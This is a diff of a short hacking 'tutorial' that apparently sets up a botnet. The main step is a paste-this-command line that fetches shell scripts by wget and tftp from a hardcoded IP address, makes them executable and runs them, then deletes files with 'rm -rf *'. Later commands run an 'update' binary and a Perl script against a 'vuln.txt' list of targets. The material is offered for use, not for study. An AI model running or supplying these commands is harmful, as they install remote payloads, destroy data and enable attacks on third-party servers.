@@ -1,8 +1,8 @@
-tut made by saiko
+Tutorial Made By saiko.
 
 AFTER YOU COPY AND PASTE THESE COMMANDS MAKE SURE YOU ACTUALLY RUN THEM BY HITTING ENTER IF THEY DONT AUTO START!
 
-1) copy and paste this:   cd /tmp || cd /run || cd /; wget http://194.15.36.212/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 194.15.36.212 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 194.15.36.212; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *
+1) copy and paste payload to root server ex:   cd /tmp || cd /run || cd /; wget http://194.15.36.212/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 194.15.36.212 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 194.15.36.212; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *
 
 2) type: cd
 
@@ -38,6 +38,3 @@ chmod 777 *
 ./update 1500
 
 perl saiko.pl vuln.txt
-
-
-https://discord.gg/xhX2DFU
